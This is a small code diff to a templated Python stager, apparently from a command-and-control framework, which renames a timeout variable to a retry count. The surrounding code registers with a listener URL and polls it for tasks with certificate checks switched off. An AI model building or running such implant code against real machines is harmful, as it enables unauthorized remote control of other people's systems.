@@ -13,7 +13,7 @@ import requests as r
 
 STAGER_ID = int("{{stager.id}}")
 DELAY = int("{{stager.delay}}")
-TIMEOUT = int("{{stager.timeout}}")
+RETRIES = int("{{stager.retries}}")
 SLEEP_TIME = int("{{stager.options['sleep-time']}}")
 SSL = "{{stager.listener.ssl}}".lower() == "true"
 if SSL:
@@ -85,7 +85,7 @@ data = {
 name = r.post(f"{URL}/connect", json=data, verify=False).json()["name"]
 
 i = 0
-while i < TIMEOUT:
+while i < RETRIES:
     time.sleep(SLEEP_TIME)
     try:
         tasks = r.get(URL + "/tasks/" + name, verify=False)
